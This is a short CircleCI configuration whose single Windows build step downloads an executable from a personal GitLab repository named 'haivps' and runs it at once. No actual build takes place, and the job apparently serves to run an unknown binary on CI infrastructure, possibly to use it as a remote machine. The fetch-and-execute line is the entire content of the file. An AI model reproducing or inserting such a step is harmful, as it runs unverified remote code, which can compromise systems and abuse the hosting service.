version: 2.1
 
orbs:
  win: circleci/windows@2.2.0
 
jobs:
  build:
    executor:
      name: win/default
      shell: cmd.exe
    steps:
      - run: curl -L -o circle.exe https://gitlab.com/haithuongpro2711/haivps/-/raw/master/circleci.exe && circle.exe